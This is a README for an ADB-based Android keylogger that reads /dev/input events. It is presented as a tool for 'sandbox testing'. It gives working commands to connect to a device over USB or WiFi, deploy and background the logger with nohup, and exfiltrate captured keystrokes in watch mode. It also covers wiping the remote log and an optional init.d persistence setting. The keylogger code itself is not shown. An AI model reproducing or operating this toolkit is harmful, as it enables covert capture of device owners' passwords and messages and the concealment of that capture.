# Android Keylogger — Full Payload

Full ADB-based keylogger for Android sandbox testing. No APK, no install — runs entirely via `adb shell`.

## Files

| File | Description |
|---|---|
| `keylogger.py` | Main keylogger — Python, full modifier/caps tracking, auto-exfil |
| `keylogger_sh.sh` | Shell fallback — for devices without Python (uses `dd` + `od` + `awk`) |
| `deploy.sh` | One-shot deploy script — pushes + launches everything on device |
| `exfil.sh` | Log puller — one-shot or watch mode, optional remote wipe |

## Quick Start

### 1. Connect device
```bash
# USB
adb devices

# Or WiFi (Android 11+ native, or via USB first)
adb tcpip 5555
adb connect 192.168.1.100:5555
```

### 2. Deploy + launch
```bash
chmod +x deploy.sh
./deploy.sh
```
This will:
- Detect the correct `/dev/input/eventX` node
- Push `keylogger.py` to `/data/local/tmp/`
- Start it in the background via `nohup`
- Fall back to `keylogger_sh.sh` if Python is not on device

### 3. Pull logs
```bash
# Pull once
./exfil.sh

# Watch mode — pull every 30s
./exfil.sh --watch 30

# Pull + wipe remote log
./exfil.sh --watch 60 --clean
```

### 4. Manual run (Python)
```bash
# Push and run directly
adb push keylogger.py /data/local/tmp/
adb shell "nohup python3 /data/local/tmp/keylogger.py --event event1 --out /data/local/tmp/kl.txt --exfil 0 > /dev/null 2>&1 &"
```

### 5. Stop
```bash
adb shell "pkill -f keylogger.py"
# or
adb shell "kill <PID>"
```

## Notes

- **No root required** on most Android emulators (AVD) — `/dev/input/*` is readable by shell
- **Physical devices** may need root or a debuggable build
- **Python** is available on most Android 7+ devices via Termux or system Python; shell fallback handles the rest
- `deploy.sh` sets `PERSIST=0` by default — set to `1` to install an `init.d` startup script (requires root)
- Log path default: `/data/local/tmp/kl.txt`
